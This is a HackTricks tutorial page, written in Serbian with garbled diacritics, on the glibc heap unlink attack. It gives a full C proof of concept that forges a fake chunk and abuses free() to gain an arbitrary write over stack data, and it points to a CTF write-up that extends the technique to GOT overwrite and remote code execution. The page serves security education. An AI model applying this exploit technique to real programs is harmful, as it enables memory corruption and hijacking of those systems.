# Unlink Napad

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJATELJSTVO**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## Osnovne Informacije

Kada je ovaj napad otkriven, uglavnom je omogu캖avao WWW (Write What Where), me캠utim, neki **proveri su dodate** 캜ine캖i novu verziju napada interesantnijom i kompleksnijom i **beskorisnom**.

### Primer Koda:

<details>

<summary>Kod</summary>
```c
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

// Altered from https://github.com/DhavalKapil/heap-exploitation/tree/d778318b6a14edad18b20421f5a06fa1a6e6920e/assets/files/unlink_exploit.c to make it work

struct chunk_structure {
size_t prev_size;
size_t size;
struct chunk_structure *fd;
struct chunk_structure *bk;
char buf[10];               // padding
};

int main() {
unsigned long long *chunk1, *chunk2;
struct chunk_structure *fake_chunk, *chunk2_hdr;
char data[20];

// First grab two chunks (non fast)
chunk1 = malloc(0x8000);
chunk2 = malloc(0x8000);
printf("Stack pointer to chunk1: %p\n", &chunk1);
printf("Chunk1: %p\n", chunk1);
printf("Chunk2: %p\n", chunk2);

// Assuming attacker has control over chunk1's contents
// Overflow the heap, override chunk2's header

// First forge a fake chunk starting at chunk1
// Need to setup fd and bk pointers to pass the unlink security check
fake_chunk = (struct chunk_structure *)chunk1;
fake_chunk->size = 0x8000;
fake_chunk->fd = (struct chunk_structure *)(&chunk1 - 3); // Ensures P->fd->bk == P
fake_chunk->bk = (struct chunk_structure *)(&chunk1 - 2); // Ensures P->bk->fd == P

// Next modify the header of chunk2 to pass all security checks
chunk2_hdr = (struct chunk_structure *)(chunk2 - 2);
chunk2_hdr->prev_size = 0x8000;  // chunk1's data region size
chunk2_hdr->size &= ~1;        // Unsetting prev_in_use bit

// Now, when chunk2 is freed, attacker's fake chunk is 'unlinked'
// This results in chunk1 pointer pointing to chunk1 - 3
// i.e. chunk1[3] now contains chunk1 itself.
// We then make chunk1 point to some victim's data
free(chunk2);
printf("Chunk1: %p\n", chunk1);
printf("Chunk1[3]: %x\n", chunk1[3]);

chunk1[3] = (unsigned long long)data;

strcpy(data, "Victim's data");

// Overwrite victim's data using chunk1
chunk1[0] = 0x002164656b636168LL;

printf("%s\n", data);

return 0;
}

```
</details>

* Napad ne funkcioni코e ako se koriste tcaches (nakon 2.26)

### Cilj

* Modifikovati pokaziva캜 na blok u steku tako da pokazuje na stek kako bi bilo mogu캖e izmeniti sadr쬬j steka upisivanjem u blok

### Zahtevi

* Odre캠ena kontrola nad memorijom (npr. stekom) kako bi se kreirali par blokova daju캖i vrednosti nekim od atributa.
* Procurenje steka kako bi se postavili pokaziva캜i la쬹og bloka.

### Napad

* Postoje par blokova (blok1 i blok2)
* Napada캜 kontroli코e sadr쬬j bloka1 i zaglavlja bloka2.
* U bloku1 napada캜 kreira strukturu la쬹og bloka:
* Da bi zaobi코ao za코titu, osigurava da je polje `size` ispravno postavljeno kako bi se izbegla gre코ka: `corrupted size vs. prev_size while consolidating`
* i polja `fd` i `bk` la쬹og bloka pokazuju na mesto gde je sme코ten pokaziva캜 bloka1 sa ofsetima -3 i -2, tako da `fake_chunk->fd->bk` i `fake_chunk->bk->fd` pokazuju na poziciju u memoriji (steku) gde se zaista nalazi adresa bloka1:

<figure><img src="../../.gitbook/assets/image (1245).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

* Zaglavlja bloka2 se modifikuju kako bi se nazna캜ilo da prethodni blok nije kori코캖en i da je veli캜ina jednaka veli캜ini sadr쬬ne la쬹e strukture.
* Kada se drugi blok oslobodi, tada se de코ava odvajanje ovog la쬹og bloka:
* `fake_chunk->fd->bk` = `fake_chunk->bk`
* `fake_chunk->bk->fd` = `fake_chunk->fd`
* Prethodno je napravljeno da `fake_chunk->fd->bk` i `fake_chunk->fd->bk` pokazuju na isto mesto (lokaciju u steku gde je sme코ten `blok1`), tako da je to bila validna povezana lista. Po코to **oboje pokazuju na istu lokaciju**, samo poslednje (`fake_chunk->bk->fd = fake_chunk->fd`) 캖e imati **efekat**.
* Ovo 캖e **prepisati pokaziva캜 na blok1 u steku na adresu (ili bajtove) sme코tene tri adrese unazad u steku**.
* Stoga, ako napada캜 mo쬰 ponovo da kontroli코e sadr쬬j bloka1, bi캖e u mogu캖nosti da **pi코e unutar steka**, mogu캖e je prepisati povratnu adresu preska캜u캖i canary i modifikovati vrednosti i pokaziva캜e lokalnih promenljivih. 캛ak i ponovnom modifikacijom adrese bloka1 sme코tene u steku na drugu lokaciju, gde ako napada캜 ponovo mo쬰 kontrolisati sadr쬬j bloka1, bi캖e u mogu캖nosti da pi코e bilo gde.
* Imajte na umu da je ovo bilo mogu캖e jer su **adrese sme코tene u steku**. Rizik i eksploatacija mogu zavisiti o **gde su adrese la쬹og bloka sme코tene**.

<figure><img src="../../.gitbook/assets/image (1246).png" alt=""><figcaption><p><a href="https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit">https://heap-exploitation.dhavalkapil.com/attacks/unlink_exploit</a></p></figcaption></figure>

## Reference

* [https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit](https://heap-exploitation.dhavalkapil.com/attacks/unlink\_exploit)
* Iako bi bilo 캜udno prona캖i unlink napad 캜ak i u CTF-u, ovde imate neke writeup-ove gde je ovaj napad kori코캖en:
* Primer CTF-a: [https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html](https://guyinatuxedo.github.io/30-unlink/hitcon14\_stkof/index.html)
* U ovom primeru, umesto steka postoji niz malloc adresa. Unlink napad se izvodi kako bi se mogao alocirati blok ovde, stoga je mogu캖e kontrolisati pokaziva캜e niza malloc adresa. Zatim, postoji jo코 jedna funkcionalnost koja omogu캖ava modifikaciju sadr쬬ja blokova na ovim adresama, 코to omogu캖ava usmeravanje adresa ka GOT-u, modifikaciju adresa funkcija za dobijanje procuri i RCE.
*

<details>

<summary><strong>Nau캜ite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi na캜ini podr코ke HackTricks-u:

* Ako 쬰lite da vidite **va코u kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvani캜ni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na코u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru쬴te se** 游눫 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 游냕 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
